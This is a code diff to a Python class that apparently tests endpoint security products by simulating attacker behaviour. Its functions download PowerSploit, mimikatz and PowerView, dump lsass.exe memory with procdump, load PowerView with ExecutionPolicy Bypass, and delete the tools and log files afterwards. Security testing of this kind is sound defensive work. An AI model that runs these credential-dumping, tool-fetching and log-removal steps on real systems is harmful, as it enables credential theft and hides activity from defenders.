@@ -3,8 +3,6 @@ from time import sleep
 import os
 from zipfile import ZipFile
 import shutil
-import sys
-import ctypes
 from colorama import init as colorama_init
 from colorama import Fore
 from colorama import Style
@@ -17,6 +15,7 @@ class EPScenario:
         self.path = path
         self.powersploit = r"https://github.com/PowerShellMafia/PowerSploit/archive/refs/heads/master.zip"
         self.mimikatz = r"https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip"
+        self.powerview = r"https://github.com/PowerShellMafia/PowerSploit/raw/refs/heads/master/Recon/PowerView.ps1"
         colorama_init() # Initialize colorset
     
 
@@ -50,7 +49,7 @@ class EPScenario:
                         print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Desktop cleaned.\n")
 
         except FileNotFoundError as e:
-            print("{Fore.RED}[-]{Style.RESET_ALL} Path not found.\n")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} Path not found.\n")
             path = input(f"{Fore.RED}[*]{Style.RESET_ALL} Enter path manually:\n")
             os.chdir(path=path)
 
@@ -81,7 +80,7 @@ class EPScenario:
 
         os.makedirs(self.path + "ProcDump", exist_ok=True)
         os.makedirs(self.path + "Dump", exist_ok=True)
-        path_ = os.path.join(f"{self.path}", "ProcDump")
+        path_ = os.path.join(self.path, "ProcDump")
         return path_
 
     
@@ -125,7 +124,7 @@ class EPScenario:
     def _cleaned_tools(self):
         '''Cleaup method to ensure all tools downloaded were removed succssfully. - mimikatz, Powersploit'''
 
-        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if any(sub in f.lower() for sub in ["mimikatz", "powersploit", "master"])]
+        files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if any(sub in f.lower() for sub in ["mimikatz", "powersploit", "powerview","master"])]
         # Put all relevant files into a list for easy iteration
 
         if not files_to_delete:
@@ -158,7 +157,7 @@ class EPScenario:
             return True
         
 
-    def remove_logs(self):
+    def _remove_logs(self):
         '''Removes log directory and or files according to input'''
 
         files_to_delete = [os.path.join(self.path, f) for f in os.listdir(self.path) if "log" in f.lower()]
@@ -215,9 +214,14 @@ class EPScenario:
             procObject.extractall(path=extraction_path)
 
         # Run command
-        try:    
-            args = f'"{extraction_path}\\procdump64.exe" -accepteula -ma lsass.exe "{self.path}\\Dump\\lsass.dmp"'
-            sp.run(["cmd.exe", "/c", args], shell=True, text=True)
+        try:
+            args = [
+                f"{extraction_path}\\procdump64.exe", 
+                "-accepteula", 
+                "-ma", 
+                "lsass.exe", 
+                f"{self.path}\\Dump\\lsass.dmp"]
+            sp.run(args, shell=True, text=True)
 
         # Handle error
         except PermissionError as e: # Ignore error output
@@ -227,13 +231,13 @@ class EPScenario:
             print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Lsass.dmp created at: {self.path}\\Dump\n\n{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Starting cleanup.....\n")
             sleep(1)
 
-            cleaned_success = self._cleaned_proc()
+        cleaned_success = self._cleaned_proc()
 
-            if cleaned_success:
-                    sleep(1)
-                    print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} ProcDump scenario cleanup done!\n")
-            else:
-                print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")
+        if cleaned_success:
+                sleep(1)
+                print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} ProcDump scenario cleanup done!\n")
+        else:
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} Cleaning files failed!\n")
 
 
     def _tools_setup(self):
@@ -298,10 +302,32 @@ class EPScenario:
             print(f"{Fore.LIGHTBLUE_EX}[*]{Style.RESET_ALL} Powersploit was most likely blocked by the security solution.\n")
             self._powersploit_exceptionH(e)
             sleep(1)
+            self._remove_logs()
 
         if self._cleaned_tools():
             print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Files were deleted successfully!\n")
+            
+
+    def run_pv(self):
+        '''Runs PowerView.ps1'''
+
+        pv_path = os.path.join(self.path, "PowerView.ps1")
+        print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Downloading PowerView.ps1 to {pv_path}...\n")
+        pv_script = None
+
+        try:
+            sp.run([self.PS, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", f"Invoke-WebRequest -Uri {self.powerview} -OutFile '{pv_path}'"], capture_output=True, text=True)
+            pv_script = pv_path.split("\\")[-1]
+            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Running {pv_script}\n")
+            sp.run([self.PS, "-ExecutionPolicy", "Bypass", "-NoProfile", "-Command", f"Import-Module '{self.path}.\\{pv_script}'"],shell=True,capture_output=True,text=True)
         
+        except (PermissionError, UnboundLocalError) as e:
+            pv_script = pv_path.split("\\")[-1]
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} Could not run {pv_script}\n")
+
+        if self._cleaned_tools():
+            print(f"{Fore.LIGHTGREEN_EX}[+]{Style.RESET_ALL} Files were deleted successfully!\n")
+
 
     def web_filters(self):
         '''Open various restricted websites to check security solutions'''
